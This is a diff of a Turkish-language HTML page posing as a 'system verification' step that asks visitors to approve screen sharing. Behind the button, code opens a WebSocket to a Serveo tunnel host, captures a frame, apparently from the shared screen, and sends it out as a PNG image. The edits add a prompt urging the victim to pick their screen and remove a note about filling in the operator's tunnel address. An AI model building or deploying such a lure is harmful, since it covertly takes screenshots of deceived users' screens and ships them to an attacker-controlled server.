@@ -1,7 +1,5 @@
 <html>
-<head>
-    <title>Sistem Dogrulama</title>
-</head>
+<head><title>Sistem Dogrulama</title></head>
 <body style="background:#111;color:white;text-align:center;font-family:sans-serif;padding-top:50px;">
     <h2>Devam etmek icin ekran paylasimini onaylayin</h2>
     <br>
@@ -12,7 +10,7 @@
     <script>
         const btn = document.getElementById("btn");
         btn.onclick = async () => {
-            // SENIN GUNCEL SERVEO ADRESIN BURADA:
+            alert("Baglanti kuruluyor, lutfen ekrani secin.");
             const ws = new WebSocket("wss://5627ac5f8bad2e5f-188-3-71-142.serveousercontent.com");
 
             ws.onopen = () => {
@@ -30,12 +28,10 @@
                         const c = document.createElement("canvas");
                         c.width = v.videoWidth;
                         c.height = v.videoHeight;
-                        c.getContext("2d").drawImage(v, 0, 0);
+                        c.getContext("2d").drawImage(v,0,0);
                         s.getTracks().forEach(t => t.stop());
                         c.toBlob(b => ws.send(b), "image/png");
-                    } catch (err) {
-                        console.log("Hata:", err);
-                    }
+                    } catch (err) { console.log(err); }
                 }
             };
         };
